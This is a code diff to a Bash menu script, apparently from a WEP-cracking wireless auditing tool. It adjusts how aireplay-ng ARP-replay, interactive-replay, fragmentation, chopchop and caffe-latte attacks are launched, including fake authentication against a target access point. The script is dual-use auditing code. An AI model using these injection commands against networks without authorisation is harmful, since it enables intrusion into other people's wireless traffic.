@@ -47,11 +47,11 @@ wep_attacks_menu(){
             "Return to main menu"
 
             case $choice in
-                1) check_client && wep_attacks arpreplay_auto; break ;;
-                2) check_client && wep_attacks arpreplay_interactive; break ;;
-                3) check_client && wep_attacks fragmentation -7; break ;;  
-                4) check_client && wep_attacks chopchopclient; break ;;
-                5) check_client && wep_attacks caffelate; break ;;
+                1) check_client ;  wep_attacks arpreplay_auto; break ;;
+                2) check_client ;  wep_attacks arpreplay_interactive; break ;;
+                3) check_client ;  wep_attacks fragmentation -7; break ;;  
+                4) check_client ;  wep_attacks chopchopclient; break ;;
+                5) check_client ;  wep_attacks caffelate; break ;;
                 6) $clear; break ;;
                 *) echo -e "`gettext \"Unknown response. Try again\"`" ;;
             esac
@@ -62,7 +62,9 @@ wep_attacks(){
     $clear
     attack=$1; shift;
 	hardclean replay_dec-*.xor
-    capture &
+    [[ $attack != menu ]] && { 
+		capture &
+	 }
     wep_attacks_$attack $@
     $clear;
 }
@@ -82,26 +84,21 @@ wep_attacks_arpreplay_auto(){
 		if [ "$FT" = "" ]; then FT="f"; fi
 	else INJMAC="FF:FF:FF:FF:FF:FF"; FT="f"; fi
 
-	if [[ $directed ]]; then
+	if [[ $directed == 1 ]]; then
 		wait_for_execute=1	
 		execute "Directed injection in Host: $Host_MAC for client $Client_MAC"\
 			$AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC\
 			 -$FT 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE
 		wait_for_execute=0
+		check_dump_xor && { wep_attacks pskarp; } || { echo -e "Something failed, XOR not generated, did the PRGA capture failed?.\nPress any key to continue" ; }
 	else
 		auth_attacks_fake &
-		wait_for_execute=1	
+		wait_for_execute=0	
 		execute "Injection in Host: $Host_MAC, with fake auth "\
 			$AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC\
 			 -$FT 1 -m 68 -n 86  -h $FAKE_MAC -x $INJECTRATE
-		wait_for_execute=0
 	fi
 
-	check_dump_xor && { 
-		wep_attacks pskarp 
-	} || {
-		 echo -e "Something failed, XOR not generated, did the PRGA capture failed?.\nPress any key to continue" 
-	};
 
 }
 
@@ -112,8 +109,9 @@ wep_attacks_arpreplay_interactive(){
         read -p "`gettext 'Set framecontrol word (hex): (0841) '`" FT
         if [ "$FT" = "" ]; then FT="0841"; fi
     else INJMAC="FF:FF:FF:FF:FF:FF"; FT="0841"; fi
-    if [[ $directed ]]; then
+    if [[ $directed == 1 ]]; then
 		execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE 
+		check_dump_xor && { wep_attacks pskarp; } || { echo -e "Something failed, XOR not generated, did the PRGA capture failed?.\nPress any key to continue" ; }
 	else
 		auth_attacks_fake &
 		execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE 
@@ -129,7 +127,7 @@ wep_attacks_fragmentation(){
 			choose_fake &
     else
         execute "Fragmentation attack" $AIREPLAY -7 -b $Host_MAC -h $Client_MAC\
-            -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi & capture &  injectmenu frag
+            -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi  &  injectmenu frag
     fi
 	injectmenu frag
 }
@@ -137,7 +135,6 @@ wep_attacks_fragmentation(){
 wep_attacks_chopchop(){
     $clear
 	hardclean replay_dec-*.xor
-    capture &
 	[[ $directed ]] || {
 		execute "Chopchoping at $Host_SSID"\
 			$AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $iwifi & 
